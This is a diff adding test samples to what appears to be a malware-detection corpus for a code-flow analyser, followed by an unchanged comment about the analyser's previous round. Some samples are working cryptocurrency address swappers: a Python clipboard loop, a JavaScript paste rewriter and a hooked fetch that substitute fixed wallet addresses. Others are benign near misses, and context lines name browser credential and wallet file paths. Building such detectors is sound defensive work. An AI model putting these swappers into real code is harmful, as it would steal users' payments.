@@ -895,6 +895,13 @@ FLOW = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", 
         "fs.copyFileSync(src, tmp);\n", "new Database(tmp)", "os.path.expandvars(r'%LOCALAPPDATA%\\x')",
         "'%APPDATA%\\Exodus\\x'", "os.environ['LOCALAPPDATA']", "process.env.LOCALAPPDATA", "'Login Data'"]
 FLOW_CURATED = [
+    # the detection round: wallet addresses swapped (and near misses)
+    "import re, time, pyperclip\nOWN = {'btc': 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh', 'eth': '0x52908400098527886E0F7030069857D2E4169EE7'}\nwhile True:\n    c = pyperclip.paste()\n    if re.match(r'^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,39}$', c):\n        pyperclip.copy(OWN['btc'])\n    elif re.match(r'^0x[a-fA-F0-9]{40}$', c):\n        pyperclip.copy(OWN['eth'])\n    time.sleep(1)\n",
+    "function check() { document.execCommand('paste'); var v = input.value;\n  v = v.replace(/^(0x)[a-fA-F0-9]{40}$/, '0x52908400098527886E0F7030069857D2E4169EE7');\n  v = v.replace(/^T[A-Za-z1-9]{33}$/, 'TLa2f6VPqDgRE67v1736s7bJ8Ray5wYjU7');\n  input.value = v; input.select(); document.execCommand('copy'); }\nsetInterval(check, 1000);\n",
+    "const own = ['0x52908400098527886E0F7030069857D2E4169EE7', 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh'];\nconst pats = { eth: /\\b0x[a-fA-F0-9]{40}\\b/g, btc: /\\b(bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{11,71})\\b/g };\nconst f = fetch;\nfetch = async function (...a) { const r = await f(...a); let t = await r.text();\n  for (const p of Object.values(pats)) t = t.replace(p, own[0]);\n  return new Response(t); };\n",
+    "export const isEth = (a) => /^0x[a-fA-F0-9]{40}$/.test(a);\nexport const isBtc = (a) => /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(a);\nexport const DONATE = '0x52908400098527886E0F7030069857D2E4169EE7';\n",
+    "const ok = /^0x[a-fA-F0-9]{40}$/.test(addr) || /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr);\nconst ROUTER = '0x7a250d5630b4cf539739df2c5dacb4c659f2488d';\nbutton.onclick = () => navigator.clipboard.writeText(addr);\n",
+    'const orig = window.fetch;\nwindow.fetch = async function (...a) { const t0 = Date.now(); const r = await orig(...a);\n  report(Date.now() - t0); return r; };\n',
     # 0.1.8's last round: a receiver's member is followed, not the receiver; keywords name nothing; an
     # object literal's methods and a callback given a call are code (a long text, where a name is followed
     # only near where it was given the data: test_rust_parity_signs' LongTextFlowParityTests)
